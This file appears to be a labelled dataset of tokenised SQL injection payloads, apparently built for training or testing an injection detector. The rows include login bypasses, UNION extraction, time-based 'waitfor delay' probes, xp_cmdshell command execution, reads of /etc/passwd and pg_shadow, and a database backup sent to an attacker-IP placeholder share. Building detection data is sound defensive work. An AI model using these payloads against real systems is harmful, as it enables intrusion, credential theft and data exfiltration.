1,BITOR,sql
2,EXCLM,sql
3,QSTN,sql
4,SLSH,sql
5,SLSH SLSH,sql
6,SLSH SLSH STAR,sql
7,SQUT,sql
8,SQUT MINUS MINUS,sql
9,LPRN,sql
10,RPRN,sql
11,STAR BITOR,sql
12,STAR SLSH STAR,sql
13,BITAND,sql
14,INT,sql
15,INT,sql
16,INT OR INT EQ INT,sql
17,0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,sql
18,0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a,sql
19,0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,sql
20,INT SMCLN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN RPRN CMMA INT CMMA INT CMMA INT SMCLN,sql
21,INT OR INT EQ INT,sql
22,INT SMCLN SELECT PRCNT INT STAR,sql
23,INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
24,SQUT PRCNT 20or PRCNT INT SQUT SQUT EQ SQUT,sql
25,SQUT PRCNT 20or PRCNT INT EQ INT,sql
26,SQUT RPRN PRCNT 20or PRCNT INT LPRN SQUT x SQUT EQ SQUT x,sql
27,SQUT PRCNT 20or PRCNT INT SQUT x SQUT EQ SQUT x,sql
28,PRCNT 20or PRCNT 20x EQ x,sql
29,PRCNT INT SQUT sleep PRCNT INT SQUT,sql
30,PRCNT INT DLLR LPRN sleep PRCNT INT RPRN,sql
31,PRCNT INT,sql
32,INT OR INT EQ INT,sql
33,PRCNT INT,sql
34,PRCNT INT PRCNT 20or PRCNT INT EQ INT,sql
35,PRCNT INT,sql
36,PRCNT INT,sql
37,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28mail PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,sql
38,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28objectclass PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,sql
39,PRCNT 2a PRCNT 7c,sql
40,BITOR BITOR INT,sql
41,SQUT BITOR BITOR SQUT INT,sql
42,LPRN BITOR BITOR INT RPRN,sql
43,PRCNT 7c,sql
44,A SQUT,sql
45,ADMIN SQUT OR SQUT,sql
46,SQUT AND INT EQ LPRN IF LPRN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN LT GT CHAR LPRN INT CMMA INT RPRN RPRN CMMA INT CMMA INT RPRN RPRN SMCLN,sql
47,SQUT AND INT IN LPRN SELECT var FROM TEMP RPRN MINUS MINUS,sql
48,anything SQUT OR SQUT x SQUT EQ SQUT x,sql
49,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,sql
50,A SQUT OR INT EQ INT MINUS MINUS,sql
51,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,sql
52,A SQUT OR INT EQ INT MINUS MINUS,sql
53,A SQUT OR SQUT A SQUT EQ SQUT A,sql
54,BITAND apos SMCLN PRCNT 20or,sql
55,AS,sql
56,ASC,sql
57,A SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
58,SQUT SMCLN BEGIN DECLARE ATR var VARCHAR LPRN INT RPRN SET ATR var EQ SQUT CLN SQUT SELECT ATR var EQ ATR var PLUS SQUT PLUS login PLUS SQUT SLSH SQUT PLUS PASSWORD PLUS SQUT SQUT FROM users WHERE login GT,sql
59,bfilename,sql
60,CHAR PRCNT INT PRCNT INT PRCNT 2b PRCNT 40select,sql
61,DECLARE ATR q nvarchar LPRN INT RPRN 0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,sql
62,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 EXEC LPRN ATR q RPRN,sql
63,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ,sql
64,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e EXEC LPRN ATR s RPRN,sql
65,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,sql
66,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ,sql
67,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e,sql
68,DELETE,sql
69,DESC,sql
70,DISTINCT,sql
71,SQUT BITOR BITOR LPRN elt LPRN MINUS INT PLUS INT CMMA bin LPRN INT RPRN CMMA ord LPRN INT RPRN CMMA HEX LPRN CHAR LPRN INT RPRN RPRN RPRN RPRN,sql
72,SQUT SMCLN EXEC master DOT DOT xp_cmdshell,sql
73,SQUT SMCLN EXEC master DOT DOT xp_cmdshell SQUT ping INT DOT INT DOT INT DOT INT SQUT MINUS MINUS,sql
74,EXEC LPRN ATR s RPRN,sql
75,SQUT SMCLN EXEC LPRN SQUT sel SQUT PLUS SQUT ect us SQUT PLUS SQUT er SQUT RPRN,sql
76,EXEC sp,sql
77,SQUT SMCLN EXECUTE IMMEDIATE SQUT sel SQUT BITOR BITOR SQUT ect us SQUT BITOR BITOR SQUT er SQUT,sql
78,EXEC xp,sql
79,SQUT SMCLN EXEC xp_regread,sql
80,SQUT GROUP BY userid HAVING INT EQ INT MINUS MINUS,sql
81,HANDLER,sql
82,HAVING,sql
83,SQUT HAVING INT EQ INT MINUS MINUS,sql
84,hi OR INT EQ INT MINUS MINUS DQUT,sql
85,hi SQUT OR INT EQ INT MINUS MINUS,sql
86,DQUT hi DQUT DQUT RPRN OR LPRN DQUT DQUT A DQUT DQUT EQ DQUT DQUT A DQUT,sql
87,hi OR A EQ A,sql
88,hi SQUT OR SQUT A SQUT EQ SQUT A,sql
89,hi SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,sql
90,SQUT hi SQUT OR SQUT x SQUT EQ SQUT x SQUT SMCLN,sql
91,INSERT,sql
92,LIKE,sql
93,LIMIT,sql
94,STAR LPRN BITOR LPRN mail EQ STAR RPRN RPRN,sql
95,STAR LPRN BITOR LPRN objectclass EQ STAR RPRN RPRN,sql
96,OR,sql
97,SQUT OR SQUT SQUT EQ SQUT,sql
98,OR INT EQ INT HASH DQUT,sql
99,SQUT OR INT EQ INT MINUS MINUS,sql
100,SQUT OR INT EQ INT HASH,sql
101,DQUT OR INT EQ INT MINUS MINUS,sql
102,OR INT EQ INT MINUS MINUS,sql
103,OR INT EQ INT HASH,sql
104,SQUT OR INT MINUS MINUS SQUT,sql
105,SQUT OR INT SLSH STAR,sql
106,SMCLN OR SQUT INT SQUT EQ SQUT INT SQUT,sql
107,SQUT OR SQUT INT SQUT EQ SQUT INT,sql
108,SQUT OR SQUT INT SQUT EQ SQUT INT SQUT MINUS MINUS,sql
109,SQUT OR INT EQ INT,sql
110,SQUT OR INT EQ INT SLSH STAR,sql
111,SQUT OR INT EQ INT MINUS MINUS,sql
112,SQUT OR INT EQ INT MINUS MINUS,sql
113,SQUT SLSH STAR STAR SLSH OR SLSH STAR STAR SLSH INT SLSH STAR STAR SLSH EQ SLSH STAR STAR SLSH INT,sql
114,â€˜ OR INT EQ INT MINUS MINUS,sql
115,DQUT OR INT EQ INT MINUS MINUS,sql
116,OR INT EQ INT,sql
117,OR INT EQ INT MINUS MINUS,sql
118,OR INT EQ INT OR DQUT DQUT EQ,sql
119,SQUT OR INT EQ INT OR SQUT SQUT EQ SQUT,sql
120,SQUT OR INT IN LPRN SELECT ATR ATR VERSION RPRN MINUS MINUS,sql
121,OR PRCNT INT EQ INT,sql
122,OR PRCNT INT EQ INT MINUS MINUS,sql
123,SQUT OR INT GT INT,sql
124,SQUT OR INT BETWEEN INT AND INT,sql
125,SQUT OR INT EQ INT,sql
126,â€˜ OR INT EQ INT MINUS MINUS,sql
127,SQUT OR SQUT INT SQUT EQ SQUT INT,sql
128,OR A EQ A,sql
129,OR A EQ A,sql
130,SQUT OR SQUT A SQUT EQ SQUT A,sql
131,SQUT OR A EQ A MINUS MINUS,sql
132,SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,sql
133,DQUT OR DQUT A DQUT EQ DQUT A,sql
134,RPRN OR LPRN A EQ A,sql
135,ORDER BY,sql
136,SQUT OR LPRN EXISTS RPRN,sql
137,OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,sql
138,DQUT OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,sql
139,SQUT OR SQUT something SQUT LIKE SQUT SOME PRCNT SQUT,sql
140,SQUT OR SQUT something SQUT EQ SQUT SOME SQUT PLUS SQUT thing SQUT,sql
141,SQUT OR SQUT TEXT SQUT EQ n SQUT TEXT SQUT,sql
142,SQUT OR SQUT TEXT SQUT GT SQUT T SQUT,sql
143,SQUT OR uid LIKE SQUT PRCNT,sql
144,SQUT OR uname LIKE SQUT PRCNT,sql
145,SQUT OR SQUT unusual SQUT EQ SQUT unusual SQUT,sql
146,SQUT OR userid LIKE SQUT PRCNT,sql
147,SQUT OR USER LIKE SQUT PRCNT,sql
148,SQUT OR username LIKE SQUT PRCNT,sql
149,SQUT OR username LIKE CHAR LPRN INT RPRN SMCLN,sql
150,SQUT OR SQUT whatever SQUT IN LPRN SQUT whatever SQUT RPRN,sql
151,SQUT MINUS MINUS BITAND PASSWORD EQ,sql
152,PASSWORD CLN STAR SLSH EQ INT MINUS MINUS,sql
153,print,sql
154,print ATR ATR variable,sql
155,PROCEDURE,sql
156,REPLACE,sql
157,SELECT,sql
158,SQUT SELECT STAR FROM information_schema DOT TABLES MINUS MINUS,sql
159,SQUT SELECT NAME FROM syscolumns WHERE ID EQ LPRN SELECT ID FROM sysobjects WHERE NAME EQ tablename SQUT RPRN MINUS MINUS,sql
160,SQUT LPRN SELECT top INT,sql
161,MINUS MINUS sp_password,sql
162,SQUT sqlattempt1,sql
163,LPRN sqlattempt2 RPRN,sql
164,SQUT sqlvuln,sql
165,SQUT PLUS sqlvuln,sql
166,LPRN sqlvuln RPRN,sql
167,sqlvuln SMCLN,sql
168,T SQUT EXEC master DOT DOT xp_cmdshell SQUT nslookup www DOT google DOT com SQUT MINUS MINUS,sql
169,to_timestamp_tz,sql
170,TRUNCATE,sql
171,tz_offset,sql
172,SQUT UNION ALL SELECT,sql
173,SQUT UNION ALL SELECT ATR ATR VERSION MINUS MINUS,sql
174,SQUT UNION SELECT,sql
175,uni SLSH STAR STAR SLSH ON sel SLSH STAR STAR SLSH ect,sql
176,SQUT UNION SELECT,sql
177,SQUT UNION SELECT INT CMMA load_file LPRN SQUT SLSH etc SLSH passwd SQUT RPRN CMMA INT CMMA INT CMMA INT SMCLN,sql
178,RPRN UNION SELECT STAR FROM information_schema DOT TABLES SMCLN,sql
179,SQUT UNION SELECT STAR FROM users WHERE login EQ CHAR LPRN INT CMMA INT CMMA INT CMMA INT RPRN SMCLN,sql
180,UPDATE,sql
181,SQUT BITOR BITOR utl_http DOT request,sql
182,CMMA ATR variable,sql
183,ATR variable,sql
184,ATR var SELECT ATR var AS var INTO TEMP END MINUS MINUS,sql
185,BSLSH x27union SELECT,sql
186,x SQUT AND INT EQ LPRN SELECT COUNT LPRN STAR RPRN FROM tabname RPRN SMCLN MINUS MINUS,sql
187,x SQUT AND email IS NULL SMCLN MINUS MINUS,sql
188,x SQUT AND members DOT email IS NULL SMCLN MINUS MINUS,sql
189,x SQUT AND userid IS NULL SMCLN MINUS MINUS,sql
190,x SQUT OR INT EQ INT OR SQUT x SQUT EQ SQUT y,sql
191,x SQUT OR full_name LIKE SQUT PRCNT bob PRCNT,sql
192,ã½ OR INT EQ INT MINUS MINUS,sql
0,SELECT versionnumber CMMA version_timestamp FROM sysibm DOT sysversions SMCLN,sql
1,SELECT USER FROM sysibm DOT sysdummy1 SMCLN,sql
2,SELECT SESSION_USER FROM sysibm DOT sysdummy1 SMCLN,sql
3,SELECT SYSTEM_USER FROM sysibm DOT sysdummy1 SMCLN,sql
4,SELECT CURRENT SERVER FROM sysibm DOT sysdummy1 SMCLN,sql
5,SELECT NAME FROM sysibm DOT systables SMCLN,sql
6,SELECT grantee FROM syscat DOT dbauth SMCLN,sql
7,SELECT STAR FROM syscat DOT tabauth SMCLN,sql
8,SELECT STAR FROM syscat DOT dbauth WHERE grantee EQ CURRENT USER SMCLN,sql
9,SELECT STAR FROM syscat DOT tabauth WHERE grantee EQ CURRENT USER SMCLN,sql
10,SELECT NAME CMMA tbname CMMA coltype FROM sysibm DOT syscolumns SMCLN,sql
11,SELECT schemaname FROM syscat DOT schemata SMCLN,sql
0,SELECT ATR ATR VERSION,sql
1,SELECT ATR ATR servernamee,sql
2,SELECT ATR ATR microsoftversione,sql
3,SELECT STAR FROM master DOT DOT sysserverse,sql
4,SELECT STAR FROM sysusers,sql
5,EXEC master DOT DOT xp_cmdshell SQUT ipconfig PLUS SLSH ALL SQUT,sql
6,EXEC master DOT DOT xp_cmdshell SQUT net PLUS VIEW SQUT,sql
7,EXEC master DOT DOT xp_cmdshell SQUT net PLUS users SQUT,sql
8,EXEC master DOT DOT xp_cmdshell SQUT ping PLUS LT attackerip GT SQUT,sql
9,backup DATABASE master TO disks EQ SQUT BSLSH BSLSH LT attackerip GT BSLSH LT attackerip GT BSLSH backupdb DOT dat SQUT,sql
10,CREATE TABLE myfile LPRN line VARCHAR LPRN INT RPRN RPRN DQUT bulk INSERT foo FROM SQUT C CLN BSLSH inetpub BSLSH wwwroot BSLSH auth DOT aspâ SQUT DQUT SELECT STAR FROM myfile DQUT MINUS MINUS,sql
0,LT username GT SQUT OR INT EQ INT MINUS MINUS,sql
1,SQUT OR SQUT SQUT EQ SQUT allows authentication WITHOUT A VALID username DOT,sql
2,LT username GT SQUT MINUS MINUS,sql
3,SQUT UNION SELECT INT CMMA SQUT LT USER MINUS fieldname GT SQUT CMMA SQUT LT pass MINUS fieldname GT SQUT INT MINUS MINUS,sql
4,SQUT OR INT EQ INT MINUS MINUS,sql
0,CREATE TABLE myfile LPRN INPUT TEXT RPRN SMCLN LOAD DATA INFILE SQUT LT filepath GT SQUT INTO TABLE myfile SMCLN SELECT STAR FROM myfile SMCLN,sql
0,SELECT VERSION LPRN RPRN SMCLN,sql
1,SELECT current_database LPRN RPRN SMCLN,sql
2,SELECT CURRENT_USER SMCLN,sql
3,SELECT SESSION_USER SMCLN,sql
4,SELECT current_setting LPRN SQUT log_connections SQUT RPRN SMCLN,sql
5,SELECT current_setting LPRN SQUT log_statement SQUT RPRN SMCLN,sql
6,SELECT current_setting LPRN SQUT port SQUT RPRN SMCLN,sql
7,SELECT current_setting LPRN SQUT password_encryption SQUT RPRN SMCLN,sql
8,SELECT current_setting LPRN SQUT krb_server_keyfile SQUT RPRN SMCLN,sql
9,SELECT current_setting LPRN SQUT virtual_host SQUT RPRN SMCLN,sql
10,SELECT current_setting LPRN SQUT port SQUT RPRN SMCLN,sql
11,SELECT current_setting LPRN SQUT config_file SQUT RPRN SMCLN,sql
12,SELECT current_setting LPRN SQUT hba_file SQUT RPRN SMCLN,sql
13,SELECT current_setting LPRN SQUT data_directory SQUT RPRN SMCLN,sql
14,SELECT STAR FROM pg_shadow SMCLN,sql
15,SELECT STAR FROM pg_group SMCLN,sql
16,CREATE TABLE myfile LPRN INPUT TEXT RPRN SMCLN,sql
17,COPY myfile FROM SQUT SLSH etc SLSH passwd SQUT SMCLN,sql
18,SELECT STAR FROM myfile SMCLN COPY myfile TO SLSH tmp SLSH test SMCLN,sql
0,RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
1,RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
2,SQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
3,SQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
4,DQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
5,DQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
6,RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
7,RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
8,SQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
9,SQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
10,DQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
11,DQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
12,CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
13,CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
14,SQUT CMMA NULL RPRN PRCNT 20waifor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
15,SQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
16,DQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
17,DQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
18,RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
19,RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
20,SQUT RPRN CMMA NULL RPRN PRCNT 20waifor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
21,SQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
22,DQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
23,DQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
24,CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
25,CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
26,SQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
27,SQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
28,DQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
29,DQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
30,RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
31,RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
32,SQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
33,SQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
34,DQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
35,DQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
36,CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
37,CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
38,SQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
39,SQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
40,DQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
41,DQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
42,RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
43,RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
44,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
45,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
46,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
47,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
48,CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
49,CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
50,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
51,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
52,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
53,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
54,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
55,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
56,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
57,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
58,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
59,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
60,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
61,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
62,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
63,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
64,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,sql
65,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,sql
